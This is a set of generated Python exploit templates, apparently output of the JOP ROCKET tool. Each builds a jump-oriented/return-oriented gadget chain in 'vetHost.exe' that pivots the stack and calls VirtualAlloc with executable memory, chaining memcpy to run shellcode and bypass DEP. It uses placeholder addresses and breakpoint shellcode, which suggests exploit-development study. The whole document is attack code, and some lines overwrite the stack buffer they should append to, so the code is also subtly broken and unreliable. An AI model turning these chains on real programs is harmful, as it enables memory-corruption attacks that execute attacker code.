
* * * * * * * * * * * * * * * * * * * * * * * * * * * *
# VirtualAlloc() JOP chain set up for functional gadgets ending in Jmp/Call EAX #1


import struct

def create_rop_chain():
	rop_gadgets = [
		0x11007353, # (base + 0x7353), # pop eax # add byte ptr [ecx], 0x11 # ret  # vetHost.exe   Load EAX with address for dispatcher gadget!
		0x1100255a, # (base + 0x255a) # add ebx, esi # jmp dword ptr [ebx] # vetHost.exe 	#This is one possible dispatcher gadget, which may or may not be viable, with -4 bytes between dispatch table slots!
		0x11017549, # (base + 0x17549), # pop ebx # ret  # vetHost.exe Load EBX with address of dispatch table
		0xdeadbeef, # Address for your dispatcher table!
		 # JMP to dispatcher gadget; start the JOP!
	]
	return ''.join(struct.pack('<I', _) for _ in rop_gadgets)



def create_jop_chain():
	jop_gadgets = [
	
			# padding  (-0x4 bytes)
		0x11001c44, # (base + 0x1c44), # pop ebp # pop ebx # add esp, 8 # jmp eax # vetHost.exe  [0x10 bytes]** 0x10
			# padding  (-0x4 bytes)
		0x11001c44, # (base + 0x1c44), # pop ebp # pop ebx # add esp, 8 # jmp eax # vetHost.exe  [0x10 bytes]** 0x20
			# padding  (-0x4 bytes)
		0x11001c44, # (base + 0x1c44), # pop ebp # pop ebx # add esp, 8 # jmp eax # vetHost.exe  [0x10 bytes]** 0x30
			# padding  (-0x4 bytes)
		0x11001c44, # (base + 0x1c44), # pop ebp # pop ebx # add esp, 8 # jmp eax # vetHost.exe  [0x10 bytes]** 0x40
			# padding  (-0x4 bytes)
		0x11001c44, # (base + 0x1c44), # pop ebp # pop ebx # add esp, 8 # jmp eax # vetHost.exe  [0x10 bytes]** 0x50
			# padding  (-0x4 bytes)
		0x11001c44, # (base + 0x1c44), # pop ebp # pop ebx # add esp, 8 # jmp eax # vetHost.exe  [0x10 bytes]** 0x60
			# padding  (-0x4 bytes)
		0x11001c44, # (base + 0x1c44), # pop ebp # pop ebx # add esp, 8 # jmp eax # vetHost.exe  [0x10 bytes]** 0x70
			# padding  (-0x4 bytes)
		0x11001c44, # (base + 0x1c44), # pop ebp # pop ebx # add esp, 8 # jmp eax # vetHost.exe  [0x10 bytes] 0x80
		# N----> STACK PIVOT TOTAL: 0x80 bytes
			# padding  (-0x4 bytes)
		0x110013af, # (base + 0x13af), # pop ebx # add esp, 0x10 # jmp edx # vetHost.exe # Set up pop for VP 		# Need 16 bytes filler, for what was done after pop ebx
			# padding  (-0x4 bytes)
		0x1100255c, # (base + 0x255c), # jmp dword ptr [ebx] # vetHost.exe # JMP to ptr for VirtualAlloc
		# JOP Chain gadgets are checked *only* to generate the desired stack pivot
	]
	return ''.join(struct.pack('<I', _) for _ in jop_gadgets)

rop_chain=create_rop_chain()
jop_chain=create_jop_chain()

vp_stack = struct.pack('<L', 0xdeadc0de) # ptr -> VirtualAlloc()

vp_stack = struct.pack('<L', 0x42424242) # Compensatory filler | 4 bytes
vp_stack = struct.pack('<L', 0x42424242) # Compensatory filler | 4 bytes
vp_stack = struct.pack('<L', 0x42424242) # Compensatory filler | 4 bytes
vp_stack = struct.pack('<L', 0x42424242) # Compensatory filler | 4 bytes
vp_stack += struct.pack('<L', 0xdeadc0de) # Pointers to memcpy, wmemcpy not found # return address  <-- where you want it to return - here we are chaining it together with memcpy
vp_stack += struct.pack('<L', 0x00625000) # lpAddress  <-- Where you want to start modifying protection
vp_stack += struct.pack('<L', 0x000003e8) # dwsize  <-- Size: 1000
vp_stack += struct.pack('<L', 0x00001000) # flAllocationType <-- 100, MEM_COMMIT
vp_stack += struct.pack('<L', 0x00000040) # flProtect <--RWX, PAGE_EXECUTE_READWRITE
vp_stack += struct.pack('<L', 0x00625000) # *Same* address as lpAddress--where the execution jumps after memcpy()
vp_stack += struct.pack('<L', 0x00625000) # *Same* address as lpAddress--i.e. desination address for memcpy()
vp_stack += struct.pack('<L', 0xffffdddd) # memcpy() destination address--i.e. Source address for shellcode
vp_stack += struct.pack('<L', 0x00002000) # mempcpy() size parameter--size of shellcode 
#This is one possible VirtualAlloc() chain; other possibilities exist!

shellcode = '\xcc\xcc\xcc\xcc' # '\xcc' is a breakpoint.
nops = '\x90' * 1
padding = '\x41' * 1

payload = padding + rop_chain + jop_chain + vp_stack + nops + shellcode	# Payload set up may vary greatly

# This was created by the JOP ROCKET.


* * * * * * * * * * * * * * * * * * * * * * * * * * * *
# VirtualAlloc() JOP chain set up for functional gadgets ending in Jmp/Call EAX #2


import struct

def create_rop_chain():
	rop_gadgets = [
		0x11007353, # (base + 0x7353), # pop eax # add byte ptr [ecx], 0x11 # ret  # vetHost.exe   Load EAX with address for dispatcher gadget!
		0x1100255a, # (base + 0x255a) # add ebx, esi # jmp dword ptr [ebx] # vetHost.exe 	#This is one possible dispatcher gadget, which may or may not be viable, with -4 bytes between dispatch table slots!
		0x11017549, # (base + 0x17549), # pop ebx # ret  # vetHost.exe Load EBX with address of dispatch table
		0xdeadbeef, # Address for your dispatcher table!
		 # JMP to dispatcher gadget; start the JOP!
	]
	return ''.join(struct.pack('<I', _) for _ in rop_gadgets)



def create_jop_chain():
	jop_gadgets = [
	
			# padding  (-0x4 bytes)
		0x11001c44, # (base + 0x1c44), # pop ebp # pop ebx # add esp, 8 # jmp eax # vetHost.exe  [0x10 bytes]** 0x10
			# padding  (-0x4 bytes)
		0x11001c44, # (base + 0x1c44), # pop ebp # pop ebx # add esp, 8 # jmp eax # vetHost.exe  [0x10 bytes]** 0x20
			# padding  (-0x4 bytes)
		0x11001c44, # (base + 0x1c44), # pop ebp # pop ebx # add esp, 8 # jmp eax # vetHost.exe  [0x10 bytes]** 0x30
			# padding  (-0x4 bytes)
		0x11001c44, # (base + 0x1c44), # pop ebp # pop ebx # add esp, 8 # jmp eax # vetHost.exe  [0x10 bytes]** 0x40
			# padding  (-0x4 bytes)
		0x11001c44, # (base + 0x1c44), # pop ebp # pop ebx # add esp, 8 # jmp eax # vetHost.exe  [0x10 bytes]** 0x50
			# padding  (-0x4 bytes)
		0x11001c44, # (base + 0x1c44), # pop ebp # pop ebx # add esp, 8 # jmp eax # vetHost.exe  [0x10 bytes]** 0x60
			# padding  (-0x4 bytes)
		0x11001c44, # (base + 0x1c44), # pop ebp # pop ebx # add esp, 8 # jmp eax # vetHost.exe  [0x10 bytes]** 0x70
			# padding  (-0x4 bytes)
		0x110013e5, # (base + 0x13e5), # pop ecx # pop ecx # pop esi # jmp eax # vetHost.exe  [0xc bytes] 0x7c
		# N----> STACK PIVOT TOTAL: 0x7c bytes
			# padding  (-0x4 bytes)
		0x110013af, # (base + 0x13af), # pop ebx # add esp, 0x10 # jmp edx # vetHost.exe # Set up pop for VP 		# Need 16 bytes filler, for what was done after pop ebx
			# padding  (-0x4 bytes)
		0x1100255c, # (base + 0x255c), # jmp dword ptr [ebx] # vetHost.exe # JMP to ptr for VirtualAlloc
		# JOP Chain gadgets are checked *only* to generate the desired stack pivot
	]
	return ''.join(struct.pack('<I', _) for _ in jop_gadgets)

rop_chain=create_rop_chain()
jop_chain=create_jop_chain()

vp_stack = struct.pack('<L', 0xdeadc0de) # ptr -> VirtualAlloc()

vp_stack = struct.pack('<L', 0x42424242) # Compensatory filler | 4 bytes
vp_stack = struct.pack('<L', 0x42424242) # Compensatory filler | 4 bytes
vp_stack = struct.pack('<L', 0x42424242) # Compensatory filler | 4 bytes
vp_stack = struct.pack('<L', 0x42424242) # Compensatory filler | 4 bytes
vp_stack += struct.pack('<L', 0xdeadc0de) # Pointers to memcpy, wmemcpy not found # return address  <-- where you want it to return - here we are chaining it together with memcpy
vp_stack += struct.pack('<L', 0x00625000) # lpAddress  <-- Where you want to start modifying protection
vp_stack += struct.pack('<L', 0x000003e8) # dwsize  <-- Size: 1000
vp_stack += struct.pack('<L', 0x00001000) # flAllocationType <-- 100, MEM_COMMIT
vp_stack += struct.pack('<L', 0x00000040) # flProtect <--RWX, PAGE_EXECUTE_READWRITE
vp_stack += struct.pack('<L', 0x00625000) # *Same* address as lpAddress--where the execution jumps after memcpy()
vp_stack += struct.pack('<L', 0x00625000) # *Same* address as lpAddress--i.e. desination address for memcpy()
vp_stack += struct.pack('<L', 0xffffdddd) # memcpy() destination address--i.e. Source address for shellcode
vp_stack += struct.pack('<L', 0x00002000) # mempcpy() size parameter--size of shellcode 
#This is one possible VirtualAlloc() chain; other possibilities exist!

shellcode = '\xcc\xcc\xcc\xcc' # '\xcc' is a breakpoint.
nops = '\x90' * 1
padding = '\x41' * 1

payload = padding + rop_chain + jop_chain + vp_stack + nops + shellcode	# Payload set up may vary greatly

# This was created by the JOP ROCKET.


* * * * * * * * * * * * * * * * * * * * * * * * * * * *
# VirtualAlloc() JOP chain set up for functional gadgets ending in Jmp/Call EAX #3


import struct

def create_rop_chain():
	rop_gadgets = [
		0x11007353, # (base + 0x7353), # pop eax # add byte ptr [ecx], 0x11 # ret  # vetHost.exe   Load EAX with address for dispatcher gadget!
		0x1100255a, # (base + 0x255a) # add ebx, esi # jmp dword ptr [ebx] # vetHost.exe 	#This is one possible dispatcher gadget, which may or may not be viable, with -4 bytes between dispatch table slots!
		0x11017549, # (base + 0x17549), # pop ebx # ret  # vetHost.exe Load EBX with address of dispatch table
		0xdeadbeef, # Address for your dispatcher table!
		 # JMP to dispatcher gadget; start the JOP!
	]
	return ''.join(struct.pack('<I', _) for _ in rop_gadgets)



def create_jop_chain():
	jop_gadgets = [
	
			# padding  (-0x4 bytes)
		0x11001c45, # (base + 0x1c45), # pop ebx # add esp, 8 # jmp eax # vetHost.exe  [0xc bytes]** 0xc
			# padding  (-0x4 bytes)
		0x11001c45, # (base + 0x1c45), # pop ebx # add esp, 8 # jmp eax # vetHost.exe  [0xc bytes]** 0x18
			# padding  (-0x4 bytes)
		0x11001c45, # (base + 0x1c45), # pop ebx # add esp, 8 # jmp eax # vetHost.exe  [0xc bytes]** 0x24
			# padding  (-0x4 bytes)
		0x11001c45, # (base + 0x1c45), # pop ebx # add esp, 8 # jmp eax # vetHost.exe  [0xc bytes]** 0x30
			# padding  (-0x4 bytes)
		0x11001c45, # (base + 0x1c45), # pop ebx # add esp, 8 # jmp eax # vetHost.exe  [0xc bytes]** 0x3c
			# padding  (-0x4 bytes)
		0x11001c45, # (base + 0x1c45), # pop ebx # add esp, 8 # jmp eax # vetHost.exe  [0xc bytes]** 0x48
			# padding  (-0x4 bytes)
		0x11001c45, # (base + 0x1c45), # pop ebx # add esp, 8 # jmp eax # vetHost.exe  [0xc bytes]** 0x54
			# padding  (-0x4 bytes)
		0x11001c45, # (base + 0x1c45), # pop ebx # add esp, 8 # jmp eax # vetHost.exe  [0xc bytes]** 0x60
			# padding  (-0x4 bytes)
		0x11001c45, # (base + 0x1c45), # pop ebx # add esp, 8 # jmp eax # vetHost.exe  [0xc bytes]** 0x6c
			# padding  (-0x4 bytes)
		0x11001c45, # (base + 0x1c45), # pop ebx # add esp, 8 # jmp eax # vetHost.exe  [0xc bytes] 0x78
		# N----> STACK PIVOT TOTAL: 0x78 bytes
			# padding  (-0x4 bytes)
		0x110013af, # (base + 0x13af), # pop ebx # add esp, 0x10 # jmp edx # vetHost.exe # Set up pop for VP 		# Need 16 bytes filler, for what was done after pop ebx
			# padding  (-0x4 bytes)
		0x1100255c, # (base + 0x255c), # jmp dword ptr [ebx] # vetHost.exe # JMP to ptr for VirtualAlloc
		# JOP Chain gadgets are checked *only* to generate the desired stack pivot
	]
	return ''.join(struct.pack('<I', _) for _ in jop_gadgets)

rop_chain=create_rop_chain()
jop_chain=create_jop_chain()

vp_stack = struct.pack('<L', 0xdeadc0de) # ptr -> VirtualAlloc()

vp_stack = struct.pack('<L', 0x42424242) # Compensatory filler | 4 bytes
vp_stack = struct.pack('<L', 0x42424242) # Compensatory filler | 4 bytes
vp_stack = struct.pack('<L', 0x42424242) # Compensatory filler | 4 bytes
vp_stack = struct.pack('<L', 0x42424242) # Compensatory filler | 4 bytes
vp_stack += struct.pack('<L', 0xdeadc0de) # Pointers to memcpy, wmemcpy not found # return address  <-- where you want it to return - here we are chaining it together with memcpy
vp_stack += struct.pack('<L', 0x00625000) # lpAddress  <-- Where you want to start modifying protection
vp_stack += struct.pack('<L', 0x000003e8) # dwsize  <-- Size: 1000
vp_stack += struct.pack('<L', 0x00001000) # flAllocationType <-- 100, MEM_COMMIT
vp_stack += struct.pack('<L', 0x00000040) # flProtect <--RWX, PAGE_EXECUTE_READWRITE
vp_stack += struct.pack('<L', 0x00625000) # *Same* address as lpAddress--where the execution jumps after memcpy()
vp_stack += struct.pack('<L', 0x00625000) # *Same* address as lpAddress--i.e. desination address for memcpy()
vp_stack += struct.pack('<L', 0xffffdddd) # memcpy() destination address--i.e. Source address for shellcode
vp_stack += struct.pack('<L', 0x00002000) # mempcpy() size parameter--size of shellcode 
#This is one possible VirtualAlloc() chain; other possibilities exist!

shellcode = '\xcc\xcc\xcc\xcc' # '\xcc' is a breakpoint.
nops = '\x90' * 1
padding = '\x41' * 1

payload = padding + rop_chain + jop_chain + vp_stack + nops + shellcode	# Payload set up may vary greatly

# This was created by the JOP ROCKET.


* * * * * * * * * * * * * * * * * * * * * * * * * * * *
# VirtualAlloc() JOP chain set up for functional gadgets ending in Jmp/Call EAX #4


import struct

def create_rop_chain():
	rop_gadgets = [
		0x11007353, # (base + 0x7353), # pop eax # add byte ptr [ecx], 0x11 # ret  # vetHost.exe   Load EAX with address for dispatcher gadget!
		0x1100255a, # (base + 0x255a) # add ebx, esi # jmp dword ptr [ebx] # vetHost.exe 	#This is one possible dispatcher gadget, which may or may not be viable, with -4 bytes between dispatch table slots!
		0x11017549, # (base + 0x17549), # pop ebx # ret  # vetHost.exe Load EBX with address of dispatch table
		0xdeadbeef, # Address for your dispatcher table!
		 # JMP to dispatcher gadget; start the JOP!
	]
	return ''.join(struct.pack('<I', _) for _ in rop_gadgets)



def create_jop_chain():
	jop_gadgets = [
	
			# padding  (-0x4 bytes)
		0x110013e5, # (base + 0x13e5), # pop ecx # pop ecx # pop esi # jmp eax # vetHost.exe  [0xc bytes]** 0xc
			# padding  (-0x4 bytes)
		0x110013e5, # (base + 0x13e5), # pop ecx # pop ecx # pop esi # jmp eax # vetHost.exe  [0xc bytes]** 0x18
			# padding  (-0x4 bytes)
		0x110013e5, # (base + 0x13e5), # pop ecx # pop ecx # pop esi # jmp eax # vetHost.exe  [0xc bytes]** 0x24
			# padding  (-0x4 bytes)
		0x110013e5, # (base + 0x13e5), # pop ecx # pop ecx # pop esi # jmp eax # vetHost.exe  [0xc bytes]** 0x30
			# padding  (-0x4 bytes)
		0x110013e5, # (base + 0x13e5), # pop ecx # pop ecx # pop esi # jmp eax # vetHost.exe  [0xc bytes]** 0x3c
			# padding  (-0x4 bytes)
		0x110013e5, # (base + 0x13e5), # pop ecx # pop ecx # pop esi # jmp eax # vetHost.exe  [0xc bytes]** 0x48
			# padding  (-0x4 bytes)
		0x110013e5, # (base + 0x13e5), # pop ecx # pop ecx # pop esi # jmp eax # vetHost.exe  [0xc bytes]** 0x54
			# padding  (-0x4 bytes)
		0x110013e5, # (base + 0x13e5), # pop ecx # pop ecx # pop esi # jmp eax # vetHost.exe  [0xc bytes]** 0x60
			# padding  (-0x4 bytes)
		0x110013e5, # (base + 0x13e5), # pop ecx # pop ecx # pop esi # jmp eax # vetHost.exe  [0xc bytes]** 0x6c
			# padding  (-0x4 bytes)
		0x11001c44, # (base + 0x1c44), # pop ebp # pop ebx # add esp, 8 # jmp eax # vetHost.exe  [0x10 bytes] 0x7c
		# N----> STACK PIVOT TOTAL: 0x7c bytes
			# padding  (-0x4 bytes)
		0x110013af, # (base + 0x13af), # pop ebx # add esp, 0x10 # jmp edx # vetHost.exe # Set up pop for VP 		# Need 16 bytes filler, for what was done after pop ebx
			# padding  (-0x4 bytes)
		0x1100255c, # (base + 0x255c), # jmp dword ptr [ebx] # vetHost.exe # JMP to ptr for VirtualAlloc
		# JOP Chain gadgets are checked *only* to generate the desired stack pivot
	]
	return ''.join(struct.pack('<I', _) for _ in jop_gadgets)

rop_chain=create_rop_chain()
jop_chain=create_jop_chain()

vp_stack = struct.pack('<L', 0xdeadc0de) # ptr -> VirtualAlloc()

vp_stack = struct.pack('<L', 0x42424242) # Compensatory filler | 4 bytes
vp_stack = struct.pack('<L', 0x42424242) # Compensatory filler | 4 bytes
vp_stack = struct.pack('<L', 0x42424242) # Compensatory filler | 4 bytes
vp_stack = struct.pack('<L', 0x42424242) # Compensatory filler | 4 bytes
vp_stack += struct.pack('<L', 0xdeadc0de) # Pointers to memcpy, wmemcpy not found # return address  <-- where you want it to return - here we are chaining it together with memcpy
vp_stack += struct.pack('<L', 0x00625000) # lpAddress  <-- Where you want to start modifying protection
vp_stack += struct.pack('<L', 0x000003e8) # dwsize  <-- Size: 1000
vp_stack += struct.pack('<L', 0x00001000) # flAllocationType <-- 100, MEM_COMMIT
vp_stack += struct.pack('<L', 0x00000040) # flProtect <--RWX, PAGE_EXECUTE_READWRITE
vp_stack += struct.pack('<L', 0x00625000) # *Same* address as lpAddress--where the execution jumps after memcpy()
vp_stack += struct.pack('<L', 0x00625000) # *Same* address as lpAddress--i.e. desination address for memcpy()
vp_stack += struct.pack('<L', 0xffffdddd) # memcpy() destination address--i.e. Source address for shellcode
vp_stack += struct.pack('<L', 0x00002000) # mempcpy() size parameter--size of shellcode 
#This is one possible VirtualAlloc() chain; other possibilities exist!

shellcode = '\xcc\xcc\xcc\xcc' # '\xcc' is a breakpoint.
nops = '\x90' * 1
padding = '\x41' * 1

payload = padding + rop_chain + jop_chain + vp_stack + nops + shellcode	# Payload set up may vary greatly

# This was created by the JOP ROCKET.


* * * * * * * * * * * * * * * * * * * * * * * * * * * *
# VirtualAlloc() JOP chain set up for functional gadgets ending in Jmp/Call EAX #5


import struct

def create_rop_chain():
	rop_gadgets = [
		0x11007353, # (base + 0x7353), # pop eax # add byte ptr [ecx], 0x11 # ret  # vetHost.exe   Load EAX with address for dispatcher gadget!
		0x1100255a, # (base + 0x255a) # add ebx, esi # jmp dword ptr [ebx] # vetHost.exe 	#This is one possible dispatcher gadget, which may or may not be viable, with -4 bytes between dispatch table slots!
		0x11017549, # (base + 0x17549), # pop ebx # ret  # vetHost.exe Load EBX with address of dispatch table
		0xdeadbeef, # Address for your dispatcher table!
		 # JMP to dispatcher gadget; start the JOP!
	]
	return ''.join(struct.pack('<I', _) for _ in rop_gadgets)



def create_jop_chain():
	jop_gadgets = [
	
			# padding  (-0x4 bytes)
		0x110013e5, # (base + 0x13e5), # pop ecx # pop ecx # pop esi # jmp eax # vetHost.exe  [0xc bytes]** 0xc
			# padding  (-0x4 bytes)
		0x110013e5, # (base + 0x13e5), # pop ecx # pop ecx # pop esi # jmp eax # vetHost.exe  [0xc bytes]** 0x18
			# padding  (-0x4 bytes)
		0x110013e5, # (base + 0x13e5), # pop ecx # pop ecx # pop esi # jmp eax # vetHost.exe  [0xc bytes]** 0x24
			# padding  (-0x4 bytes)
		0x110013e5, # (base + 0x13e5), # pop ecx # pop ecx # pop esi # jmp eax # vetHost.exe  [0xc bytes]** 0x30
			# padding  (-0x4 bytes)
		0x110013e5, # (base + 0x13e5), # pop ecx # pop ecx # pop esi # jmp eax # vetHost.exe  [0xc bytes]** 0x3c
			# padding  (-0x4 bytes)
		0x110013e5, # (base + 0x13e5), # pop ecx # pop ecx # pop esi # jmp eax # vetHost.exe  [0xc bytes]** 0x48
			# padding  (-0x4 bytes)
		0x110013e5, # (base + 0x13e5), # pop ecx # pop ecx # pop esi # jmp eax # vetHost.exe  [0xc bytes]** 0x54
			# padding  (-0x4 bytes)
		0x110013e5, # (base + 0x13e5), # pop ecx # pop ecx # pop esi # jmp eax # vetHost.exe  [0xc bytes]** 0x60
			# padding  (-0x4 bytes)
		0x110013e5, # (base + 0x13e5), # pop ecx # pop ecx # pop esi # jmp eax # vetHost.exe  [0xc bytes]** 0x6c
			# padding  (-0x4 bytes)
		0x110013e5, # (base + 0x13e5), # pop ecx # pop ecx # pop esi # jmp eax # vetHost.exe  [0xc bytes] 0x78
		# N----> STACK PIVOT TOTAL: 0x78 bytes
			# padding  (-0x4 bytes)
		0x110013af, # (base + 0x13af), # pop ebx # add esp, 0x10 # jmp edx # vetHost.exe # Set up pop for VP 		# Need 16 bytes filler, for what was done after pop ebx
			# padding  (-0x4 bytes)
		0x1100255c, # (base + 0x255c), # jmp dword ptr [ebx] # vetHost.exe # JMP to ptr for VirtualAlloc
		# JOP Chain gadgets are checked *only* to generate the desired stack pivot
	]
	return ''.join(struct.pack('<I', _) for _ in jop_gadgets)

rop_chain=create_rop_chain()
jop_chain=create_jop_chain()

vp_stack = struct.pack('<L', 0xdeadc0de) # ptr -> VirtualAlloc()

vp_stack = struct.pack('<L', 0x42424242) # Compensatory filler | 4 bytes
vp_stack = struct.pack('<L', 0x42424242) # Compensatory filler | 4 bytes
vp_stack = struct.pack('<L', 0x42424242) # Compensatory filler | 4 bytes
vp_stack = struct.pack('<L', 0x42424242) # Compensatory filler | 4 bytes
vp_stack += struct.pack('<L', 0xdeadc0de) # Pointers to memcpy, wmemcpy not found # return address  <-- where you want it to return - here we are chaining it together with memcpy
vp_stack += struct.pack('<L', 0x00625000) # lpAddress  <-- Where you want to start modifying protection
vp_stack += struct.pack('<L', 0x000003e8) # dwsize  <-- Size: 1000
vp_stack += struct.pack('<L', 0x00001000) # flAllocationType <-- 100, MEM_COMMIT
vp_stack += struct.pack('<L', 0x00000040) # flProtect <--RWX, PAGE_EXECUTE_READWRITE
vp_stack += struct.pack('<L', 0x00625000) # *Same* address as lpAddress--where the execution jumps after memcpy()
vp_stack += struct.pack('<L', 0x00625000) # *Same* address as lpAddress--i.e. desination address for memcpy()
vp_stack += struct.pack('<L', 0xffffdddd) # memcpy() destination address--i.e. Source address for shellcode
vp_stack += struct.pack('<L', 0x00002000) # mempcpy() size parameter--size of shellcode 
#This is one possible VirtualAlloc() chain; other possibilities exist!

shellcode = '\xcc\xcc\xcc\xcc' # '\xcc' is a breakpoint.
nops = '\x90' * 1
padding = '\x41' * 1

payload = padding + rop_chain + jop_chain + vp_stack + nops + shellcode	# Payload set up may vary greatly

# This was created by the JOP ROCKET.


* * * * * * * * * * * * * * * * * * * * * * * * * * * *
# VirtualAlloc() JOP chain set up for functional gadgets ending in Jmp/Call EBX #1


import struct

def create_rop_chain():
	rop_gadgets = [
		0x11017549, # (base + 0x17549), # pop ebx # ret  # vetHost.exe   Load EBX with address for dispatcher gadget!
		0x11002746, # (base + 0x2746) # add eax, 0x12 # xor edx, edx # jmp dword ptr [eax] # vetHost.exe 	#This is one possible dispatcher gadget, which may or may not be viable, with 14 bytes between dispatch table slots!
		0x11007353, # (base + 0x7353), # pop eax # add byte ptr [ecx], 0x11 # ret  # vetHost.exe Load EAX with address of dispatch table
		0xdeadbeef, # Address for your dispatcher table!
		 # JMP to dispatcher gadget; start the JOP!
	]
	return ''.join(struct.pack('<I', _) for _ in rop_gadgets)



def create_jop_chain():
	jop_gadgets = [
	
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100256c, # (base + 0x256c), # add esp, 0x14 # xor eax, eax # pop edi # pop esi # jmp ebx # vetHost.exe  [0x1c bytes]** 0x1c
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100256c, # (base + 0x256c), # add esp, 0x14 # xor eax, eax # pop edi # pop esi # jmp ebx # vetHost.exe  [0x1c bytes]** 0x38
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100256c, # (base + 0x256c), # add esp, 0x14 # xor eax, eax # pop edi # pop esi # jmp ebx # vetHost.exe  [0x1c bytes]** 0x54
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100256c, # (base + 0x256c), # add esp, 0x14 # xor eax, eax # pop edi # pop esi # jmp ebx # vetHost.exe  [0x1c bytes]** 0x70
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100256c, # (base + 0x256c), # add esp, 0x14 # xor eax, eax # pop edi # pop esi # jmp ebx # vetHost.exe  [0x1c bytes] 0x8c
		# N----> STACK PIVOT TOTAL: 0x8c bytes
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110013bb, # (base + 0x13bb), # pop eax # jmp esi # vetHost.exe # Set up pop for VP 		# Need 0 bytes filler, for what was done after pop eax
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100274b, # (base + 0x274b), # jmp dword ptr [eax] # vetHost.exe # JMP to ptr for VirtualAlloc
		# JOP Chain gadgets are checked *only* to generate the desired stack pivot
	]
	return ''.join(struct.pack('<I', _) for _ in jop_gadgets)

rop_chain=create_rop_chain()
jop_chain=create_jop_chain()

vp_stack = struct.pack('<L', 0xdeadc0de) # ptr -> VirtualAlloc()

vp_stack += struct.pack('<L', 0xdeadc0de) # Pointers to memcpy, wmemcpy not found # return address  <-- where you want it to return - here we are chaining it together with memcpy
vp_stack += struct.pack('<L', 0x00625000) # lpAddress  <-- Where you want to start modifying protection
vp_stack += struct.pack('<L', 0x000003e8) # dwsize  <-- Size: 1000
vp_stack += struct.pack('<L', 0x00001000) # flAllocationType <-- 100, MEM_COMMIT
vp_stack += struct.pack('<L', 0x00000040) # flProtect <--RWX, PAGE_EXECUTE_READWRITE
vp_stack += struct.pack('<L', 0x00625000) # *Same* address as lpAddress--where the execution jumps after memcpy()
vp_stack += struct.pack('<L', 0x00625000) # *Same* address as lpAddress--i.e. desination address for memcpy()
vp_stack += struct.pack('<L', 0xffffdddd) # memcpy() destination address--i.e. Source address for shellcode
vp_stack += struct.pack('<L', 0x00002000) # mempcpy() size parameter--size of shellcode 
#This is one possible VirtualAlloc() chain; other possibilities exist!

shellcode = '\xcc\xcc\xcc\xcc' # '\xcc' is a breakpoint.
nops = '\x90' * 1
padding = '\x41' * 1

payload = padding + rop_chain + jop_chain + vp_stack + nops + shellcode	# Payload set up may vary greatly

# This was created by the JOP ROCKET.


* * * * * * * * * * * * * * * * * * * * * * * * * * * *
# VirtualAlloc() JOP chain set up for functional gadgets ending in Jmp/Call EBX #2


import struct

def create_rop_chain():
	rop_gadgets = [
		0x11017549, # (base + 0x17549), # pop ebx # ret  # vetHost.exe   Load EBX with address for dispatcher gadget!
		0x11002746, # (base + 0x2746) # add eax, 0x12 # xor edx, edx # jmp dword ptr [eax] # vetHost.exe 	#This is one possible dispatcher gadget, which may or may not be viable, with 14 bytes between dispatch table slots!
		0x11007353, # (base + 0x7353), # pop eax # add byte ptr [ecx], 0x11 # ret  # vetHost.exe Load EAX with address of dispatch table
		0xdeadbeef, # Address for your dispatcher table!
		 # JMP to dispatcher gadget; start the JOP!
	]
	return ''.join(struct.pack('<I', _) for _ in rop_gadgets)



def create_jop_chain():
	jop_gadgets = [
	
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100256c, # (base + 0x256c), # add esp, 0x14 # xor eax, eax # pop edi # pop esi # jmp ebx # vetHost.exe  [0x1c bytes]** 0x1c
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100256c, # (base + 0x256c), # add esp, 0x14 # xor eax, eax # pop edi # pop esi # jmp ebx # vetHost.exe  [0x1c bytes]** 0x38
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100256c, # (base + 0x256c), # add esp, 0x14 # xor eax, eax # pop edi # pop esi # jmp ebx # vetHost.exe  [0x1c bytes]** 0x54
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100256c, # (base + 0x256c), # add esp, 0x14 # xor eax, eax # pop edi # pop esi # jmp ebx # vetHost.exe  [0x1c bytes]** 0x70
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110034fe, # (base + 0x34fe), # pop edi # and edi, eax # pop eax # jmp ebx # vetHost.exe  [0x8 bytes] 0x78
		# N----> STACK PIVOT TOTAL: 0x78 bytes
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110013bb, # (base + 0x13bb), # pop eax # jmp esi # vetHost.exe # Set up pop for VP 		# Need 0 bytes filler, for what was done after pop eax
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100274b, # (base + 0x274b), # jmp dword ptr [eax] # vetHost.exe # JMP to ptr for VirtualAlloc
		# JOP Chain gadgets are checked *only* to generate the desired stack pivot
	]
	return ''.join(struct.pack('<I', _) for _ in jop_gadgets)

rop_chain=create_rop_chain()
jop_chain=create_jop_chain()

vp_stack = struct.pack('<L', 0xdeadc0de) # ptr -> VirtualAlloc()

vp_stack += struct.pack('<L', 0xdeadc0de) # Pointers to memcpy, wmemcpy not found # return address  <-- where you want it to return - here we are chaining it together with memcpy
vp_stack += struct.pack('<L', 0x00625000) # lpAddress  <-- Where you want to start modifying protection
vp_stack += struct.pack('<L', 0x000003e8) # dwsize  <-- Size: 1000
vp_stack += struct.pack('<L', 0x00001000) # flAllocationType <-- 100, MEM_COMMIT
vp_stack += struct.pack('<L', 0x00000040) # flProtect <--RWX, PAGE_EXECUTE_READWRITE
vp_stack += struct.pack('<L', 0x00625000) # *Same* address as lpAddress--where the execution jumps after memcpy()
vp_stack += struct.pack('<L', 0x00625000) # *Same* address as lpAddress--i.e. desination address for memcpy()
vp_stack += struct.pack('<L', 0xffffdddd) # memcpy() destination address--i.e. Source address for shellcode
vp_stack += struct.pack('<L', 0x00002000) # mempcpy() size parameter--size of shellcode 
#This is one possible VirtualAlloc() chain; other possibilities exist!

